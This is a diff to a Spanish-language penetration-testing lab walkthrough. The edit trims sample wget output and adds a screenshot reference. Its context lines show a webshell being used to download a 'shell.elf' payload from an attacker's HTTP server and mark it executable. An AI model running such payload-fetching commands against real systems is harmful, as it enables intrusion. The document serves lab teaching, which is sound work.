@@ -713,24 +713,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 wget http://192.168.0.30:8000/shell.elf -O /tmp/shell.elf
 ```
 
-**Resultado:**
-```
---2026-01-09 13:20:15--  http://192.168.0.30:8000/shell.elf
-Connecting to 192.168.0.30:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 207 [application/octet-stream]
-Saving to: '/tmp/shell.elf'
-
-/tmp/shell.elf      100%[===================>]     207  --.-KB/s    in 0s
-
-2026-01-09 13:20:15 (42.3 MB/s) - '/tmp/shell.elf' saved [207/207]
-```
-
-**En el servidor HTTP de Kali verás:**
-```
-192.168.0.21 - - [09/Jan/2026 13:20:15] "GET /shell.elf HTTP/1.1" 200 -
-```
-
 #### Paso 3: Dar permisos de ejecución
 
 **Comando en webshell:**
@@ -743,6 +725,7 @@ chmod +x /tmp/shell.elf
 Command: ls -la /tmp/shell.elf
 Resultado: -rwxr-xr-x 1 www-data www-data 207 ene 9 13:20 /tmp/shell.elf
 ```
+![Verificamos su subida](img/verificar-subida.jpg)
 
 **✅ Payload listo para ejecutar**
 
